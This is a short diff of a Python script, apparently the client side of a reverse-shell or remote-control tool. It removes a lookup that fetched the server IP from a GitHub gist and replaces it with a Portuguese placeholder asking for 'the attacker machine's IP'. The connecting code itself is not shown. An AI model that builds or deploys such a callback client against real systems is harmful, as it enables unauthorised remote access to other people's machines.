@@ -3,17 +3,8 @@ import os
 import subprocess
 import requests
 
-GIST_RAW_URL = "https://gist.githubusercontent.com/daviwll/a8c3564129a5db5ba5e5adcae70cea4b/raw/fd05499963671eb0c5cef4d1c31f27fddd89362d/ip.txt"
-
-def get_server_ip():
-    try:
-        response = requests.get(GIST_RAW_URL)
-        return response.text.strip()
-    except:
-        return None
-
 def connect_server():
-    host = get_server_ip() 
+    host = "<Coloque o IP da máquina atacante>"
 
     if not host:
         print("Não foi possível obter o IP do servidor.")
